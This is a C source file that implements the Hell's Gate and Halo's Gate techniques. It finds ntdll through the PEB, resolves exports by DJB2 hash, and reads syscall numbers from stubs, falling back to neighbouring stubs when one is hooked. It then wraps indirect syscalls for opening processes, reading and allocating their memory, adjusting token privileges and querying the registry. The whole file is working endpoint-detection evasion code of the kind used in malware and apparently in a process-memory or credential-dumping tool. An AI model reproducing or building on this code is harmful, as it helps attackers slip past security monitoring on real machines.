/**
 * Hell's Gate + Halo's Gate — Dynamic SSN resolution from ntdll.dll in memory.
 * All syscalls resolved by DJB2 hash. PEB helpers for OS info / command line.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"

SYSCALL_TABLE g_ssn = {0};
SYSCALL_ADDR_TABLE g_addr = {0};
PVOID g_ret_gadget = NULL;

/* ── PEB access ──────────────────────────────────────────── */

PVOID get_peb(void) {
    return (PVOID)__readgsqword(0x60);
}

static PVOID get_ntdll_base(void) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY list = peb->Ldr->InMemoryOrderModuleList.Flink;
    list = list->Flink;
    PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return entry->DllBase;
}

PUNICODE_STRING get_command_line(void) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return &peb->ProcessParameters->CommandLine;
}

PUNICODE_STRING get_image_path(void) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return &peb->ProcessParameters->ImagePathName;
}

DWORD get_os_major(void) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return peb->OSMajorVersion;
}

DWORD get_os_minor(void) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return peb->OSMinorVersion;
}

DWORD get_os_build(void) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return (DWORD)peb->OSBuildNumber;
}

DWORD get_tick(void) {
    return *(volatile DWORD *)((BYTE *)(ULONG_PTR)KUSER_SHARED_DATA_ADDR + TICK_COUNT_LOW_OFFSET);
}

/* ── Hash + export resolution ────────────────────────────── */

static inline DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    while (*str)
        hash = ((hash << 5) + hash) + (unsigned char)*str++;
    return hash;
}

static PVOID get_export_by_hash(PVOID module_base, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)module_base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE *)module_base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD *names = (DWORD *)((BYTE *)module_base + exports->AddressOfNames);
    WORD *ordinals = (WORD *)((BYTE *)module_base + exports->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)((BYTE *)module_base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)((BYTE *)module_base + names[i]);
        if (djb2_hash(name) == target_hash) {
            return (BYTE *)module_base + functions[ordinals[i]];
        }
    }
    return NULL;
}

/* ── SSN extraction (Hell's Gate + Halo's Gate) ──────────── */

static BOOL extract_ssn(BYTE *func_addr, DWORD *ssn_out, PVOID *syscall_addr_out) {
    if (func_addr[0] == 0x4C && func_addr[1] == 0x8B && func_addr[2] == 0xD1 &&
        func_addr[3] == 0xB8) {
        *ssn_out = *(DWORD *)(func_addr + 4);
        for (int i = 0; i < 32; i++) {
            if (func_addr[i] == 0x0F && func_addr[i + 1] == 0x05) {
                *syscall_addr_out = func_addr + i;
                return TRUE;
            }
        }
        return FALSE;
    }

    /* Halo's Gate: check neighbors */
    for (int distance = 1; distance < 20; distance++) {
        BYTE *up = func_addr - (distance * 32);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            *ssn_out = *(DWORD *)(up + 4) + distance;
            for (int i = 0; i < 32; i++) {
                if (up[i] == 0x0F && up[i + 1] == 0x05) {
                    *syscall_addr_out = up + i;
                    return TRUE;
                }
            }
        }
        BYTE *down = func_addr + (distance * 32);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            *ssn_out = *(DWORD *)(down + 4) - distance;
            for (int i = 0; i < 32; i++) {
                if (down[i] == 0x0F && down[i + 1] == 0x05) {
                    *syscall_addr_out = down + i;
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

static BOOL resolve_one(PVOID ntdll, DWORD hash, DWORD *ssn, PVOID *addr) {
    BYTE *func = (BYTE *)get_export_by_hash(ntdll, hash);
    if (!func) return FALSE;
    return extract_ssn(func, ssn, addr);
}

/* ── Resolve all syscalls ────────────────────────────────── */

BOOL resolve_syscalls(void) {
    PVOID ntdll = get_ntdll_base();
    if (!ntdll) return FALSE;

    BOOL ok = TRUE;
    ok &= resolve_one(ntdll, H_NtOpenProcess, &g_ssn.NtOpenProcess, &g_addr.NtOpenProcess);
    ok &= resolve_one(ntdll, H_NtClose, &g_ssn.NtClose, &g_addr.NtClose);
    ok &= resolve_one(ntdll, H_NtQueryVirtualMemory, &g_ssn.NtQueryVirtualMemory, &g_addr.NtQueryVirtualMemory);
    ok &= resolve_one(ntdll, H_NtReadVirtualMemory, &g_ssn.NtReadVirtualMemory, &g_addr.NtReadVirtualMemory);
    ok &= resolve_one(ntdll, H_NtQueryInformationProcess, &g_ssn.NtQueryInformationProcess, &g_addr.NtQueryInformationProcess);
    ok &= resolve_one(ntdll, H_NtCreateFile, &g_ssn.NtCreateFile, &g_addr.NtCreateFile);
    ok &= resolve_one(ntdll, H_NtWriteFile, &g_ssn.NtWriteFile, &g_addr.NtWriteFile);
    ok &= resolve_one(ntdll, H_NtReadFile, &g_ssn.NtReadFile, &g_addr.NtReadFile);
    ok &= resolve_one(ntdll, H_NtAllocateVirtualMemory, &g_ssn.NtAllocateVirtualMemory, &g_addr.NtAllocateVirtualMemory);
    ok &= resolve_one(ntdll, H_NtFreeVirtualMemory, &g_ssn.NtFreeVirtualMemory, &g_addr.NtFreeVirtualMemory);
    ok &= resolve_one(ntdll, H_NtSetInformationFile, &g_ssn.NtSetInformationFile, &g_addr.NtSetInformationFile);
    ok &= resolve_one(ntdll, H_NtTerminateProcess, &g_ssn.NtTerminateProcess, &g_addr.NtTerminateProcess);
    ok &= resolve_one(ntdll, H_NtFlushBuffersFile, &g_ssn.NtFlushBuffersFile, &g_addr.NtFlushBuffersFile);
    ok &= resolve_one(ntdll, H_NtOpenKey, &g_ssn.NtOpenKey, &g_addr.NtOpenKey);
    ok &= resolve_one(ntdll, H_NtQueryKey, &g_ssn.NtQueryKey, &g_addr.NtQueryKey);
    ok &= resolve_one(ntdll, H_NtQueryValueKey, &g_ssn.NtQueryValueKey, &g_addr.NtQueryValueKey);
    ok &= resolve_one(ntdll, H_NtEnumerateKey, &g_ssn.NtEnumerateKey, &g_addr.NtEnumerateKey);
    ok &= resolve_one(ntdll, H_NtOpenProcessToken, &g_ssn.NtOpenProcessToken, &g_addr.NtOpenProcessToken);
    ok &= resolve_one(ntdll, H_NtAdjustPrivilegesToken, &g_ssn.NtAdjustPrivilegesToken, &g_addr.NtAdjustPrivilegesToken);

    if (g_addr.NtClose)
        g_ret_gadget = (BYTE *)g_addr.NtClose + 2;

    return ok;
}

/* ── Typed syscall wrappers ──────────────────────────────── */

NTSTATUS sys_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                           POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    return indirect_syscall(g_ssn.NtOpenProcess, g_addr.NtOpenProcess,
                           ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS sys_NtClose(HANDLE Handle) {
    return indirect_syscall(g_ssn.NtClose, g_addr.NtClose, Handle);
}

NTSTATUS sys_NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                   DWORD MemoryInformationClass, PVOID MemoryInformation,
                                   SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    return indirect_syscall_s2(g_ssn.NtQueryVirtualMemory, g_addr.NtQueryVirtualMemory,
                           ProcessHandle, BaseAddress, MemoryInformationClass,
                           MemoryInformation, MemoryInformationLength, ReturnLength);
}

NTSTATUS sys_NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                  PVOID Buffer, SIZE_T NumberOfBytesToRead,
                                  PSIZE_T NumberOfBytesRead) {
    return indirect_syscall_s2(g_ssn.NtReadVirtualMemory, g_addr.NtReadVirtualMemory,
                           ProcessHandle, BaseAddress, Buffer,
                           NumberOfBytesToRead, NumberOfBytesRead);
}

NTSTATUS sys_NtQueryInformationProcess(HANDLE ProcessHandle, DWORD ProcessInformationClass,
                                        PVOID ProcessInformation, ULONG ProcessInformationLength,
                                        PULONG ReturnLength) {
    return indirect_syscall_s2(g_ssn.NtQueryInformationProcess, g_addr.NtQueryInformationProcess,
                           ProcessHandle, ProcessInformationClass, ProcessInformation,
                           ProcessInformationLength, ReturnLength);
}

NTSTATUS sys_NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
                           POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
                           PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
                           ULONG ShareAccess, ULONG CreateDisposition,
                           ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
    return indirect_syscall_s7(g_ssn.NtCreateFile, g_addr.NtCreateFile,
                           FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
                           AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
                           CreateOptions, EaBuffer, EaLength);
}

NTSTATUS sys_NtWriteFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
                          PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
                          PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    return indirect_syscall_s7(g_ssn.NtWriteFile, g_addr.NtWriteFile,
                           FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
                           Buffer, Length, ByteOffset, Key);
}

NTSTATUS sys_NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
                         PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
                         PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    return indirect_syscall_s7(g_ssn.NtReadFile, g_addr.NtReadFile,
                           FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
                           Buffer, Length, ByteOffset, Key);
}

NTSTATUS sys_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                      ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                      ULONG AllocationType, ULONG Protect) {
    return indirect_syscall_s2(g_ssn.NtAllocateVirtualMemory, g_addr.NtAllocateVirtualMemory,
                           ProcessHandle, BaseAddress, ZeroBits, RegionSize,
                           AllocationType, Protect);
}

NTSTATUS sys_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                  PSIZE_T RegionSize, ULONG FreeType) {
    return indirect_syscall(g_ssn.NtFreeVirtualMemory, g_addr.NtFreeVirtualMemory,
                           ProcessHandle, BaseAddress, RegionSize, FreeType);
}

NTSTATUS sys_NtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
                                   PVOID FileInformation, ULONG Length,
                                   DWORD FileInformationClass) {
    return indirect_syscall_s2(g_ssn.NtSetInformationFile, g_addr.NtSetInformationFile,
                           FileHandle, IoStatusBlock, FileInformation, Length,
                           FileInformationClass);
}

NTSTATUS sys_NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
    return indirect_syscall(g_ssn.NtTerminateProcess, g_addr.NtTerminateProcess,
                           ProcessHandle, (ULONG_PTR)ExitStatus);
}

NTSTATUS sys_NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock) {
    return indirect_syscall(g_ssn.NtFlushBuffersFile, g_addr.NtFlushBuffersFile,
                           FileHandle, IoStatusBlock);
}

NTSTATUS sys_NtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess,
                       POBJECT_ATTRIBUTES ObjectAttributes) {
    return indirect_syscall(g_ssn.NtOpenKey, g_addr.NtOpenKey,
                           KeyHandle, DesiredAccess, ObjectAttributes);
}

NTSTATUS sys_NtQueryKey(HANDLE KeyHandle, ULONG KeyInformationClass,
                        PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
    return indirect_syscall_s2(g_ssn.NtQueryKey, g_addr.NtQueryKey,
                           KeyHandle, KeyInformationClass, KeyInformation,
                           Length, ResultLength);
}

NTSTATUS sys_NtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName,
                              ULONG KeyValueInformationClass, PVOID KeyValueInformation,
                              ULONG Length, PULONG ResultLength) {
    return indirect_syscall_s2(g_ssn.NtQueryValueKey, g_addr.NtQueryValueKey,
                           KeyHandle, ValueName, KeyValueInformationClass,
                           KeyValueInformation, Length, ResultLength);
}

NTSTATUS sys_NtEnumerateKey(HANDLE KeyHandle, ULONG Index,
                             ULONG KeyInformationClass, PVOID KeyInformation,
                             ULONG Length, PULONG ResultLength) {
    return indirect_syscall_s2(g_ssn.NtEnumerateKey, g_addr.NtEnumerateKey,
                           KeyHandle, Index, KeyInformationClass,
                           KeyInformation, Length, ResultLength);
}

NTSTATUS sys_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                                 PHANDLE TokenHandle) {
    return indirect_syscall(g_ssn.NtOpenProcessToken, g_addr.NtOpenProcessToken,
                           ProcessHandle, DesiredAccess, TokenHandle);
}

NTSTATUS sys_NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
                                      PTOKEN_PRIVILEGES NewState, ULONG BufferLength,
                                      PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength) {
    return indirect_syscall_s2(g_ssn.NtAdjustPrivilegesToken, g_addr.NtAdjustPrivilegesToken,
                           TokenHandle, (ULONG_PTR)DisableAllPrivileges, NewState,
                           BufferLength, PreviousState, ReturnLength);
}
